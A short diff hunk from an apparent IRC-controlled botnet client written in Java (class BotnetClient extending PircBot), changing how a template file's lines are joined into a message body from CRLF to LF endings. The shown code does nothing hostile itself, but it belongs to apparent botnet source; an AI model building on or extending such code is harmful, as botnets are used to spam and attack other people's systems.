@@ -120,7 +120,7 @@ public class BotnetClient extends PircBot {
 					try {
 						Scanner in = new Scanner(new File(TEMPLATE));
 						while (in.hasNextLine()) {
-							body += in.nextLine() + "\r\n";
+							body += in.nextLine() + "\n";
 						}
 					} catch (Exception e) {
 						System.out.println("There were problems reading " + TEMPLATE);
